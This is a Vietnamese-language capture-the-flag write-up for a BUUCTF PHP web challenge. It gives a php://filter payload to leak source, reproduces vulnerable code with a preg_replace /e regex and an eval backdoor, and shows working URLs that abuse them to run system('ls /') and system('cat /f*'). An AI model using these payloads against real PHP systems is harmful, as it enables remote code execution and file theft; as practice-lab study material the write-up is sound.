![Screenshot 2023-12-19 100803](https://github.com/Llam-a/BUUCTF/assets/115911041/f8f686d1-21bf-42f8-b353-9519b1a0e616)

Challenge này khá giống chall [này](https://github.com/Llam-a/BUUCTF/blob/main/%5BGXYCTF2019%5D%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83.md) nên là mình skip vài bước đầu.

Payload: `?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&file=php://filter/convert.base64-encode/resource=next.php`

Sau đó được 1 chuỗi base64 đem đi decode

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei', 
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```

Có 2 hàm trong source mà ta có thể dùng để bypass là `getFlag` và `eval`.Nhưng trong source lại ko có hàm nào có thể trigger 2 hàm đó.Nhưng 

```php
function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}
```
Cú pháp của `preg_replace($pattern, $replacement, $subject);`.Nói cho dễ hiều thì ví dụ `preg_replace(1,2,3)` thì 3 sẽ đi tìm 1 bên trong 3 và từ đó thay đổi cái vừa tìm được thành 2. Điểm quan trọng là `/e`, 'ei' của hàm preg_replace() cho phép sử dụng regex là một biểu thức PHP và kiểu chữ thường trong kết quả thay thế.

Mình có đọc wu [ở đây](https://xz.aliyun.com/t/2557) để hiểu thêm cách bypass `preg_replace()\e`

Theo wu đó thì mình sử dụng `. *` để bypass ví dụ

`return preg_replace('/(. *)/ei', 'strtolower("\\1")', 'LAMA');`

Thì kết quả trả về sẽ là `lama`

Vậy từ đề bài

```php
Original statement: preg_replace('/(' . $regex . ')/ei', 'strtolower("\\1")', $value);
Change the statement: preg_replace('/(.*)/ei', 'strtolower("\\1")', {${phpinfo()}});
```

Đầu tiên mình ls các file ra `/next.php?\S*=${getFlag()}&cmd=system("ls /");`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/1e7747b0-2f7e-4cc6-8661-291c1ec644d8)

Rồi giờ mình cat flag ra thôi `/next.php?\S*=${getFlag()}&cmd=system("cat%20/f*");`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/23d78709-a9d7-4448-a51b-d19f751b2606)


